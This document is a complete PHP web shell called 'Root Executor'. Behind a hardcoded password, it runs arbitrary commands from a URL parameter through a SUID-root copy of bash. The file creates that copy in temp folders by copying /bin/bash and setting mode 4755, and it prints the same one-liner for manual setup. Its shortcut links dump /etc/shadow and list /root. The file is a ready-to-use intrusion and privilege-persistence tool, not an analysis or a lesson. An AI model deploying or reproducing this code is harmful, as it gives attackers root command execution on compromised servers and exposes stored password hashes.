<?php
// ============================================
// NaughtySec
// ============================================

error_reporting(0);
ini_set('display_errors', 0);

$password = 'R00t12345';

if (!isset($_GET['p']) || $_GET['p'] !== $password) {
    die('
    <html>
    <body style="background:#0a0a0a;color:#d4d4d4;font-family:monospace;padding:20px;text-align:center;padding-top:100px;">
        <h2 style="color:#4ec9b0;">⚡ Root Executor</h2>
        <form method="GET">
            <input type="password" name="p" placeholder="Enter password..." style="padding:10px;width:250px;background:#1a1a1a;border:1px solid #333;color:#d4d4d4;border-radius:5px;">
            <input type="submit" value="Login" style="padding:10px 20px;background:#0e639c;border:none;color:white;border-radius:5px;cursor:pointer;">
        </form>
    </body>
    </html>
    ');
}

$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'id';

// CARI SUID BASH
$suid_paths = [
    '/var/tmp/bash_suid',
    '/tmp/bash_suid',
    '/tmp/.suid_bash',
    '/var/tmp/.suid_bash',
    '/dev/shm/bash_suid',
    '/tmp/root_bash'
];

$suid = false;
foreach ($suid_paths as $path) {
    if (file_exists($path) && is_executable($path)) {
        $suid = $path;
        break;
    }
}

// JIKA TIDAK DITEMUKAN, COBA BUAT
if (!$suid) {
    if (copy('/bin/bash', '/var/tmp/bash_suid')) {
        chown('/var/tmp/bash_suid', 0, 0);
        chmod('/var/tmp/bash_suid', 04755);
        if (file_exists('/var/tmp/bash_suid')) {
            $suid = '/var/tmp/bash_suid';
        }
    }
}

// EKSEKUSI COMMAND
$output = '';
if ($suid) {
    $output = shell_exec($suid . ' -p -c ' . escapeshellarg($cmd) . ' 2>&1');
} else {
    $output = "Error: SUID bash not found!\n";
    $output .= "Try: cp /bin/bash /var/tmp/bash_suid && chown root:root /var/tmp/bash_suid && chmod 4755 /var/tmp/bash_suid\n";
}

// TAMPILKAN OUTPUT
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Root Exec</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:#0a0a0a;color:#d4d4d4;font-family:monospace;padding:20px;}
        .container{max-width:900px;margin:0 auto;}
        h1{color:#4ec9b0;font-size:20px;margin-bottom:15px;}
        .info{background:#1a1a1a;padding:10px 15px;border-radius:5px;border-left:3px solid #4ec9b0;margin-bottom:15px;font-size:13px;}
        .info .ok{color:#4ec9b0;}
        .info .err{color:#f48771;}
        form{display:flex;gap:10px;margin-bottom:15px;flex-wrap:wrap;}
        input[type="text"]{flex:1;min-width:200px;padding:12px 15px;background:#1a1a1a;border:1px solid #2a2a2a;border-radius:5px;color:#d4d4d4;font-family:monospace;font-size:14px;outline:none;}
        input[type="text"]:focus{border-color:#4ec9b0;}
        input[type="submit"]{padding:12px 25px;background:#0e639c;border:none;border-radius:5px;color:white;font-weight:bold;cursor:pointer;}
        input[type="submit"]:hover{background:#1177bb;}
        .output{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:5px;overflow:hidden;}
        .output .cmd{background:#2a2a2a;padding:8px 15px;color:#569cd6;border-bottom:1px solid #333;}
        .output .cmd span{color:#4ec9b0;}
        .output pre{padding:15px;margin:0;white-space:pre-wrap;word-wrap:break-word;color:#d4d4d4;font-size:13px;line-height:1.5;max-height:500px;overflow-y:auto;}
        .footer{margin-top:15px;text-align:center;color:#333;font-size:11px;}
        a{color:#4ec9b0;text-decoration:none;}
        a:hover{text-decoration:underline;}
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ Root Executor</h1>
        
        <div class="info">
            <?php if ($suid): ?>
                <span class="ok">✔ SUID Active</span> &nbsp;|&nbsp; 
                Path: <code><?php echo htmlspecialchars($suid); ?></code> &nbsp;|&nbsp;
                Running as: <strong>root</strong>
            <?php else: ?>
                <span class="err">✖ SUID Not Found</span> &nbsp;|&nbsp;
                Run: <code>cp /bin/bash /var/tmp/bash_suid && chown root:root /var/tmp/bash_suid && chmod 4755 /var/tmp/bash_suid</code>
            <?php endif; ?>
        </div>
        
        <form method="GET">
            <input type="hidden" name="p" value="<?php echo htmlspecialchars($password); ?>">
            <input type="text" name="cmd" placeholder="Enter command..." value="<?php echo htmlspecialchars($cmd); ?>" autofocus>
            <input type="submit" value="▶ Execute">
        </form>
        
        <div class="output">
            <div class="cmd"><span>$</span> <?php echo htmlspecialchars($cmd); ?></div>
            <pre><?php echo htmlspecialchars($output); ?></pre>
        </div>
        
        <div class="footer">
            <a href="?p=<?php echo urlencode($password); ?>&cmd=id">id</a> &nbsp;·&nbsp;
            <a href="?p=<?php echo urlencode($password); ?>&cmd=whoami">whoami</a> &nbsp;·&nbsp;
            <a href="?p=<?php echo urlencode($password); ?>&cmd=cat%20/etc/shadow">shadow</a> &nbsp;·&nbsp;
            <a href="?p=<?php echo urlencode($password); ?>&cmd=ls%20-la%20/root">/root</a> &nbsp;·&nbsp;
            <a href="?p=<?php echo urlencode($password); ?>&cmd=" style="color:#666;">clear</a>
        </div>
    </div>
</body>
</html>
<?php
// END
?>